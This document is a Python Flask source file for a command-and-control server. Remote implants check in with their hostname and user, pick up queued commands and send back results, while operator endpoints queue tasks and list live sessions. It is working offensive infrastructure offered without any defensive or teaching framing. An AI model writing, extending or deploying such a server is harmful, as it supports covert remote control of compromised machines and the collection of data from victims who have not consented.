from flask import Flask, request, jsonify
import time
import threading

app = Flask(__name__)

# --- In-Memory Data Stores (Thread-Safe) ---
command_queue = {}
response_queue = {}
active_sessions = {}

# Using locks to ensure thread safety for our dictionaries
locks = {
    "command": threading.Lock(),
    "response": threading.Lock(),
    "session": threading.Lock()
}

# --- Implant-Facing Endpoints ---
@app.route('/implant/hello', methods=['POST'])
def handle_implant_hello():
    """Endpoint for implants to check in and get tasks."""
    data = request.json
    session_id = data.get("session_id")
    if not session_id:
        return jsonify({"error": "session_id is required"}), 400

    # Update the session's last seen time and info
    with locks["session"]:
        active_sessions[session_id] = {
            "last_seen": time.time(),
            "hostname": data.get("hostname"),
            "user": data.get("user")
        }

    # Retrieve any pending commands for this implant
    with locks["command"]:
        commands_to_execute = command_queue.pop(session_id, [])

    return jsonify({"commands": commands_to_execute})

@app.route('/implant/response', methods=['POST'])
def handle_implant_response():
    """Endpoint for implants to post results of executed tasks."""
    data = request.json
    session_id = data.get("session_id")
    if not session_id:
        return jsonify({"error": "session_id is required"}), 400

    with locks["response"]:
        response_queue.setdefault(session_id, []).append(data)

    return jsonify({"status": "ok"})


# --- C2 Manager-Facing Endpoints ---
@app.route('/c2/task', methods=['POST'])
def handle_c2_task():
    """Endpoint for the C2 Manager to queue a task for an implant."""
    data = request.json
    session_id = data.get("session_id")
    command = data.get("command")
    if not all([session_id, command]):
        return jsonify({"status": "error", "message": "session_id and command are required"}), 400

    with locks["command"]:
        command_queue.setdefault(session_id, []).append(command)

    return jsonify({"status": "tasked"})

@app.route('/c2/responses', methods=['POST'])
def get_c2_responses():
    """Endpoint for the C2 Manager to retrieve responses from an implant."""
    session_id = request.json.get("session_id")
    if not session_id:
        return jsonify({"error": "session_id is required"}), 400
        
    with locks["response"]:
        responses = response_queue.pop(session_id, [])

    return jsonify({"responses": responses})

@app.route('/c2/sessions', methods=['GET'])
def discover_sessions():
    """Endpoint for the C2 Manager to get a list of active implants."""
    live_sessions = {}
    # Implants are considered offline if they haven't checked in for 30 seconds
    timeout_threshold = time.time() - 30 
    
    with locks["session"]:
        # Filter out sessions that have timed out
        for sid, data in active_sessions.items():
            if data["last_seen"] > timeout_threshold:
                live_sessions[sid] = data
        
        # Update the main dictionary to only contain live sessions
        active_sessions.clear()
        active_sessions.update(live_sessions)

    return jsonify({"sessions": live_sessions})


# --- Main Execution ---
if __name__ == '__main__':
    # Using '0.0.0.0' makes the server accessible on your local network
    app.run(host='0.0.0.0', port=5555, debug=False)